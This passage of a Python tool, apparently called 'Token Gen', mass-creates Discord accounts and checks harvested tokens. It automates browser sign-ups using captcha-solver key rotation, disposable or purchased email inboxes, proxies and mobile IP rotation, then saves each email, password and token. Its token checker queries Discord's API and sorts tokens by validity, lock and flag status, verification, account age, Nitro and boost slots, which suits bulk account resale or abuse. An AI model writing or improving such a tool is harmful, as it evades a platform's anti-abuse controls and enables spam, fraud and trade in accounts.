                                log.warning(f"Pool verify error: {e}")

            # Check token status — run in executor so it doesn't block other threads
            result = await loop.run_in_executor(None, check_token, token)
            log.token_status(result)
            await loop.run_in_executor(None, save_account_to_file, email, password, token, result)

            with LOCK:
                SESSION_CREATED += 1
                created_now = SESSION_CREATED

            log.success('account ' + CYAN + '#' + str(created_now) + RESET + ' saved')

            # Clear session
            try:
                await page.evaluate("() => { localStorage.clear(); sessionStorage.clear(); }")
            except Exception:
                pass

            browser     = None
            profile_dir = None

            # Check target
            if SESSION_TARGET > 0 and created_now >= SESSION_TARGET:
                with LOCK:
                    SESSION_STOP = True
                log.success('target reached  ' + GRAY + str(created_now) + '/' + str(SESSION_TARGET))
                return
        else:
            log.warning('token not found')

    except Exception as e:
        log.error('worker crashed  ' + GRAY + str(e))

    finally:
        pass


# ============================================================================
# TOKEN CHECKER
# ============================================================================

def run_token_checker(num_threads: int):
    """Token checker — reads tokens from output/valid.txt and checks them against Discord API."""
    _base        = Path(__file__).parent
    _tokens_file = _base / "output" / "valid.txt"

    # ── Load tokens ──
    if not _tokens_file.exists():
        print(f"\n  {RED}valid.txt not found at {_tokens_file}{RESET}")
        input(f"  {GRAY}press enter to continue...{RESET}  ")
        return

    with open(_tokens_file, "r") as _tf:
        _tc_tokens = list(set(ln for ln in _tf.readlines() if ln.strip()))

    if not _tc_tokens:
        print(f"\n  {YELLOW}No tokens found in output/valid.txt{RESET}")
        input(f"  {GRAY}press enter to continue...{RESET}  ")
        return

    # ── Settings (all checks enabled) ──
    _tc_cfg  = {"main": {"proxyless": True, "threads": num_threads}}
    _tc_sett = {"nitro": True, "age": True, "type": True, "flagged": True}

    # ── Load proxies from input/proxies.txt ──
    try:
        with open(_base / "input" / "proxies.txt", "r") as _pf:
            _tc_proxies = [ln.strip() for ln in _pf if ln.strip()]
        if _tc_proxies:
            _tc_cfg["main"]["proxyless"] = False
    except Exception:
        _tc_proxies = []

    # ── Output folder: output/checker output/{date} {time}/ ──
    os.makedirs(_base / "output", exist_ok=True)
    os.makedirs(_base / "output" / "checker output", exist_ok=True)
    _tc_out = str(_base / "output" / "checker output" / time.strftime('%Y-%m-%d %H-%M-%S'))
    os.makedirs(_tc_out, exist_ok=True)

    # ── Shared state (use single-element lists so nested scopes can mutate) ──
    _LOCK      = threading.Lock()
    _valid     = [0]; _invalid = [0]; _locked  = [0]
    _nitro     = [0]; _flagged = [0]; _current = [0]
    _total     = len(_tc_tokens)
    _done      = [False]
    _start     = time.time()
    _tc_retries = {}   # token → retry count; max 2 retries per token

    # ── Console title updater ──
    def _tc_update_title():
        try:
            while not _done[0]:
                time.sleep(0.03)
                _el  = time.time() - _start
                _cpm = round((_current[0] / _el) * 60) if _el > 0 else 0
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f"Token Checker  |  Valid: {_valid[0]}  |  Invalid: {_invalid[0]}  |  "
                    f"Locked: {_locked[0]}  |  Remaining: {len(_tc_tokens)}  |  "
                    f"Checked: {_current[0] / _total * 100:.1f}%  |  CPM: {_cpm}"
                )
        except Exception:
            pass

    # ── Log helpers ──
    def _tc_ok(msg, tok, **kw):
        _kstr = "  ".join(f"{GRAY}[{WHITE}{k}: {GREEN}{v}{GRAY}]{RESET}" for k, v in kw.items())
        print(f"  {GRAY}[{GREEN}●{GRAY}]{WHITE} {msg}  {GRAY}tok=[{WHITE}{tok}{GRAY}]{RESET}  {_kstr}")

    def _tc_err(msg, tok, **kw):
        _kstr = "  ".join(f"{GRAY}[{WHITE}{k}: {RED}{v}{GRAY}]{RESET}" for k, v in kw.items())
        print(f"  {GRAY}[{RED}●{GRAY}]{WHITE} {msg}  {GRAY}tok=[{WHITE}{tok}{GRAY}]{RESET}  {_kstr}")

    # ── Proxy URL builder ──
    def _build_proxy_url(raw: str) -> str:
        from urllib.parse import quote as _q
        _parts = raw.strip().split(":", 3)
        if len(_parts) == 4:
            _h, _p, _u, _pw = _parts
            return f"http://{_q(_u, safe='')}:{_q(_pw, safe='')}@{_h}:{_p}"
        return f"http://{raw.strip()}"

    # ── Checker class — mirrors original checker exactly ──
    class _Checker:
        def __init__(self):
            self._sess = tls_client.Session()
            self._sess.headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/120.0.0.0 Safari/537.36"
            }
            self._set_proxy()

        def _set_proxy(self):
            if not _tc_cfg["main"].get("proxyless", True) and _tc_proxies:
                self._sess.proxies = _build_proxy_url(random.choice(_tc_proxies))

        def _make_proxyless(self):
            """Replace session with a fresh proxyless one (called after 407)."""
            self._sess = tls_client.Session()
            self._sess.headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/120.0.0.0 Safari/537.36"
            }

        def check(self):
            while True:
                with _LOCK:
                    if not _tc_tokens:
                        break
                    _tok = _tc_tokens.pop().strip()

                _tok_only = ""
                try:
                    _tok_only  = _tok.split(":")[-1]
                    _tok_short = _tok_only.split(".")[0]
                    self._sess.headers["Authorization"] = _tok_only

                    _r = self._sess.get("https://discord.com/api/v9/users/@me/guilds")

                    if _r.status_code == 429:
                        _tc_err("Rate limited", _tok_short)
                        self._set_proxy()
                        with _LOCK:
                            _tc_tokens.append(_tok)
                        continue

                    _current[0] += 1

                    if _r.status_code == 401:
                        _invalid[0] += 1
                        _tc_err("Invalid", _tok_short)
                        with _LOCK:
                            with open(f"{_tc_out}/invalid.txt", "a") as _f:
                                _f.write(_tok + "\n")
                        continue

                    if _r.status_code == 403:
                        _locked[0] += 1
                        _tc_err("Locked", _tok_short)
                        with _LOCK:
                            with open(f"{_tc_out}/locked.txt", "a") as _f:
                                _f.write(_tok + "\n")
                        continue

                    if _r.status_code == 200:
                        _r2   = self._sess.get("https://discord.com/api/v9/users/@me")
                        _args = {}

                        if _tc_sett.get("flagged"):
                            if _r2.json().get("flags", 0) & 1048576 == 1048576:
                                _flagged[0] += 1
                                _tc_err("Flagged", _tok_short)
                                with _LOCK:
                                    with open(f"{_tc_out}/flagged.txt", "a") as _f:
                                        _f.write(_tok + "\n")
                                continue

                        if _tc_sett.get("type"):
                            _ttype = "unclaimed"
                            if _r2.json().get("email") is not None:
                                _ttype = "email verified"
                            if _r2.json().get("phone") is not None:
                                _ttype = "fully verified" if _ttype == "email verified" else "phone verified"
                        else:
                            _ttype = "valid"
                        _args["type"] = _ttype

                        if _tc_sett.get("age"):
                            _uid     = _r2.json().get("id", "0")
                            _created = ((int(_uid) >> 22) + 1420070400000) / 1000
                            _age_mo  = (time.time() - _created) / 86400 / 30
                            _age_str = (f"{_age_mo / 12:.0f} years"
                                        if _age_mo > 12 else f"{_age_mo:.0f} months")
                            _args["age"] = _age_str
                            _age_dir = f"{_tc_out}/age/{_age_str}"
                            os.makedirs(_age_dir, exist_ok=True)
                            with _LOCK:
                                with open(f"{_age_dir}/{_ttype}.txt", "a") as _f:
                                    _f.write(_tok + "\n")

                        if _tc_sett.get("nitro"):
                            _r3 = self._sess.get(
                                "https://discord.com/api/v9/users/@me/billing/subscriptions")
                            for _sub in _r3.json():
                                try:
                                    _days = (time.mktime(time.strptime(
                                        _sub["current_period_end"],
                                        "%Y-%m-%dT%H:%M:%S.%f%z")) - time.time()) / 86400
                                    _args["nitro"] = f"{_days:.0f}d"
                                    _nitro[0] += 1
                                    _r4   = self._sess.get(
                                        "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots")
                                    _avail = sum(1 for _slot in _r4.json()
                                                 if _slot.get("cooldown_ends_at") is None)
                                    _args["boosts"] = _avail
                                    _boost_dir = f"{_tc_out}/boosts/{_days:.0f} days"
                                    os.makedirs(_boost_dir, exist_ok=True)
                                    with _LOCK:
                                        with open(f"{_boost_dir}/{_avail} boosts.txt", "a") as _f:
                                            _f.write(_tok + "\n")
                                except Exception:
                                    pass

                        _valid[0] += 1
                        _tc_ok("Valid", _tok_short, **_args)
                        with _LOCK:
                            with open(f"{_tc_out}/{_ttype}.txt", "a") as _f:
                                _f.write(_tok + "\n")

                except Exception as _e:
                    _err_str = str(_e)
                    _tok_part = _tok_only.split(".")[0] if _tok_only else "?"
                    if "407" in _err_str:
                        _tc_err("Proxy auth failed — proxyless fallback", _tok_part)
                        _tc_cfg["main"]["proxyless"] = True
                        self._make_proxyless()
                        with _LOCK:
                            _tries = _tc_retries.get(_tok, 0) + 1
                            if _tries < 2:
                                _tc_retries[_tok] = _tries
                                _tc_tokens.append(_tok)
                            else:
                                _tc_retries.pop(_tok, None)
                                _current[0] += 1
                    else:
                        _tc_err("Error", _tok_part, error=_err_str)
                        self._set_proxy()
                        with _LOCK:
                            _tries = _tc_retries.get(_tok, 0) + 1
                            if _tries < 2:
                                _tc_retries[_tok] = _tries
                                _tc_tokens.append(_tok)
                            else:
                                _tc_retries.pop(_tok, None)
                                _current[0] += 1

    # ── Launch ──
    _title_t = threading.Thread(target=_tc_update_title, daemon=True)
    _title_t.start()

    print(f"\n  {CYAN}▸ Checking {_total} token(s) using {num_threads} thread(s){RESET}")
    print(f"  {GRAY}Output → {_tc_out}{RESET}\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as _pool:
        for _ in range(num_threads):
            _pool.submit(_Checker().check)

    _done[0] = True
    _title_t.join(timeout=1)

    _el = time.time() - _start
    _m, _s_val = divmod(int(_el), 60)

    print()
    print(f"  {CYAN}{'─' * 56}{RESET}")
    print(f"  {WHITE}Total checked : {CYAN}{_current[0]}{RESET}")
    print(f"  {WHITE}Valid         : {GREEN}{_valid[0]}{RESET}")
    print(f"  {WHITE}Invalid       : {RED}{_invalid[0]}{RESET}")
    print(f"  {WHITE}Locked        : {YELLOW}{_locked[0]}{RESET}")
    print(f"  {WHITE}Nitro         : {CYAN}{_nitro[0]}{RESET}")
    print(f"  {WHITE}Flagged       : {RED}{_flagged[0]}{RESET}")
    print(f"  {WHITE}Time          : {GRAY}{_m}m {_s_val}s{RESET}")
    print(f"  {CYAN}{'─' * 56}{RESET}")
    input(f"\n  {GRAY}press enter to exit...{RESET}  ")


# ============================================================================
# MAIN FUNCTION
# ============================================================================

async def main():
    """Main function"""
    global SESSION_TARGET, SESSION_CREATED, SESSION_STOP, NOPECHA_BROWSER, LAST_IP

    # Enable ANSI on Windows
    if sys.platform == 'win32':
        import ctypes
        try:
            ctypes.windll.kernel32.SetConsoleMode(
                ctypes.windll.kernel32.GetStdHandle(-11), 7
            )
        except Exception:
            pass

    # ══════════════════════════════════════════════════════════════
    # BANNER  (static — cyberpunk / glitch aesthetic)
    # ══════════════════════════════════════════════════════════════

    # ── Gradient palette: deep indigo → violet → magenta → pink ──
    _grad = [
        '\033[38;5;53m', '\033[38;5;54m', '\033[38;5;55m',
        '\033[38;5;91m', '\033[38;5;92m', '\033[38;5;93m',
        '\033[38;5;128m', '\033[38;5;129m', '\033[38;5;134m',
        '\033[38;5;135m', '\033[38;5;141m', '\033[38;5;170m',
        '\033[38;5;171m', '\033[38;5;177m', '\033[38;5;207m',
        '\033[38;5;213m', '\033[38;5;219m',
    ]
    _BOLD  = '\033[1m'

    def _gc(ci, width=78):
        idx = int((ci / max(width - 1, 1)) * (len(_grad) - 1))
        return _grad[min(idx, len(_grad) - 1)]

    def _gradient_line(text, bold=False):
        out = []
        for ci, ch in enumerate(text):
            if ch == ' ':
                out.append(' ')
            else:
                pfx = _BOLD if bold else ''
                out.append(f"{pfx}{_gc(ci, len(text))}{ch}{RESET}")
        return "".join(out)

    # ── Main block text — pyfiglet 'bloody' font ──
    _banner_rows = [
        "▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █      ▄████ ▓█████  ███▄    █ ",
        "▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █     ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ",
        "▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒   ▒██░▄▄▄░▒███   ▓██  ▀█ ██▒",
        "░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒",
        "  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░   ░▒▓███▀▒░▒████▒▒██░   ▓██░",
        "  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒     ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒",
        "    ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░     ░   ░  ░ ░  ░░ ░░   ░ ▒░",
        "  ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░    ░ ░   ░    ░      ░   ░ ░ ",
        "             ░ ░  ░  ░      ░  ░         ░          ░    ░  ░         ░  ",
    ]
    _col_count = max(len(r) for r in _banner_rows)
    _banner_rows = [r.ljust(_col_count) for r in _banner_rows]

    # ═══════════════════════════════════════════════════════════════
    # RENDER
    # ═══════════════════════════════════════════════════════════════

    _out = sys.stdout.write
    _out("\n")

    # ── "Made by SoliderX" ──
    _out(f"  {_BOLD}\033[38;5;141m★  Made by SoliderX  ★{RESET}\n")
    _out("\n")

    # ── Main banner with gradient ──
    for _li, _text in enumerate(_banner_rows):
        _out("  " + _gradient_line(_text, bold=(_li < 2)) + "\n")

    _out("\n")
    sys.stdout.flush()

    # ══════════════════════════════════════════════════════════════
    # TOOL SELECTION MENU
    # ══════════════════════════════════════════════════════════════

    _out(f"  {_gradient_line('[1]  Token Generator', bold=True)}\n")
    _out(f"  {_gradient_line('[2]  Token Checker',   bold=True)}\n")
    _out("\n")

    _w(f"  {CYAN}▸ Select option : {RESET}")
    _menu = input().strip()
    print()

    if _menu == "2":
        _w(f"  {CYAN}▸ Threads for checker : {RESET}")
        _ct_in = input().strip()
        _ct    = int(_ct_in) if _ct_in.isdigit() and int(_ct_in) > 0 else 10
        run_token_checker(_ct)
        return

    # ══════════════════════════════════════════════════════════════
    # SETUP PROMPTS
    # ══════════════════════════════════════════════════════════════

    default_threads = config.get("Threads", 1)

    _w(f"  {CYAN}▸ Number of threads  : {RESET}")
    threads_input = input().strip()
    if threads_input.isdigit() and int(threads_input) > 0:
        config["Threads"] = int(threads_input)

    _w(f"  {CYAN}▸ Accounts to generate (0 = ∞) : {RESET}")
    count_input = input().strip()
    SESSION_TARGET  = int(count_input) if count_input.isdigit() else 0
    SESSION_CREATED = 0
    SESSION_STOP    = False

    num_threads = config.get("Threads", 1)
    tgt_label   = str(SESSION_TARGET) if SESSION_TARGET > 0 else "∞"

    await boot_sequence()

    # ══════════════════════════════════════════════════════════════
    # INITIAL SETUP
    # ══════════════════════════════════════════════════════════════
    pool_enabled      = config.get("email_api", {}).get("hotmail_pool", {}).get("enabled", False)
    cybertemp_enabled = config.get("email_api", {}).get("cybertemp", {}).get("enabled", False)
    hotmail_key       = config.get("email_api", {}).get("hotmail007", {}).get("client_key", "").strip()
    hotmail_auto_buy  = config.get("email_api", {}).get("hotmail007", {}).get("auto_buy", False)

    if pool_enabled:
        mail_label = "hotmail pool"
        config["email_api"]["cybertemp"]["enabled"] = False
        config["email_api"]["hotmail007"]["auto_buy"] = False
    elif cybertemp_enabled:
        mail_label = "cybertemp"
        config["email_api"]["hotmail007"]["auto_buy"] = False
    elif hotmail_auto_buy and hotmail_key:
        mail_label = "hotmail007"
    else:
        mail_label = "none"

    proxy_enabled = config.get("proxy", {}).get("enabled", False)
    if proxy_enabled:
        proxies = load_proxies(config)
        config["proxy_session"] = get_random_proxy(proxies) if proxies else None
        proxy_label = "enabled"
        proxy_status = "on"
    else:
        config["proxy_session"] = None
        proxy_label = "disabled"
        proxy_status = "off"

    use_adb  = False
    adb_path = config.get("adb", {}).get("path", "adb")
    if adb_path and adb_path != "adb":
        if not (os.path.isabs(adb_path) and not os.path.exists(adb_path)):
            adb_mgr = ADBManager(adb_path)
            devices = adb_mgr.find_devices()
            if devices:
                use_adb = True

    # Info box  (matches reference image)
    sep = f"  {GRAY}{'─' * 60}{RESET}"
    print(sep)
    print(
        f"  {GRAY}|{RESET}  {CYAN}Mail: {WHITE}{mail_label:<28}{RESET}"
        f"  {GRAY}|{RESET}  {CYAN}Proxies: {WHITE}{proxy_label}{RESET}  {GRAY}|{RESET}"
    )
    print(sep)
    print()

    # STATUS line
    log._tag(CYAN, 'STATUS',
        f'{WHITE}Starting  {GRAY}|  '
        f'{CYAN}threads={num_threads}  '
        f'accounts={tgt_label}  '
        f'proxies={proxy_status}{RESET}')
    print()

    # ══════════════════════════════════════════════════════════════
    # CONCURRENT GENERATION LOOP
    # ══════════════════════════════════════════════════════════════

    async def run_thread(thread_id: int):
        """One perpetual worker thread — creates accounts until target reached."""
        browser = None
        while not SESSION_STOP:
            try:
                # Start a fresh browser for this thread
                browser = await create_browser(thread_id)
                await worker(thread_id=thread_id, browser=browser)
            except Exception as e:
                log.error(f'T{thread_id} error  {GRAY}{e}')
            finally:
                # Always clean up the browser after each account attempt
                try:
                    if browser:
                        await browser.stop()
                except Exception:
                    pass
                browser = None

                if PSUTIL_AVAILABLE:
                    try:
                        profile_str = str(NOPECHA_PROFILE.parent / f"nopecha_profile_{thread_id}")
                        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                            try:
                                if any(x in (proc.info['name'] or '').lower() for x in ['brave', 'chrome', 'chromium']):
                                    if profile_str in ' '.join(proc.info['cmdline'] or []):
                                        proc.kill()
                            except (psutil.NoSuchProcess, psutil.AccessDenied):
                                pass
                    except Exception:
                        pass

            if SESSION_STOP:
                break

            rotate_nopecha_key()

            if use_adb:
                try:
                    await adb_mgr.rotate_ip()
                    await asyncio.sleep(2)
                except Exception:
                    pass
            else:
                # Stagger cooldown per thread to avoid all threads hitting at once
                cooldown = 90
                for remaining in range(cooldown, 0, -1):
                    if SESSION_STOP:
                        break
                    m, s = divmod(remaining, 60)
                    _w(f"\r  {GRAY}T{thread_id} next in  {CYAN}{m:02d}:{s:02d}{RESET}   ")
                    await asyncio.sleep(1)
                if not SESSION_STOP:
                    print()

    # Launch all threads concurrently
    tasks = [asyncio.create_task(run_thread(i + 1)) for i in range(num_threads)]
    await asyncio.gather(*tasks)

    print()
    log.success(f'Done  {GRAY}→{RESET}  {CYAN}{SESSION_CREATED}{RESET} account(s) created')


if __name__ == "__main__":
    warnings.filterwarnings('ignore', category=ResourceWarning)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}interrupted{RESET}")
    except Exception as e:
        print(f"\n  {RED}fatal  {GRAY}→{RESET}  {e}")
        import traceback
        traceback.print_exc()

    print(f"\n  {CYAN}{'─' * 48}{RESET}")
    input(f"  {GRAY}press enter to exit...{RESET}  ")
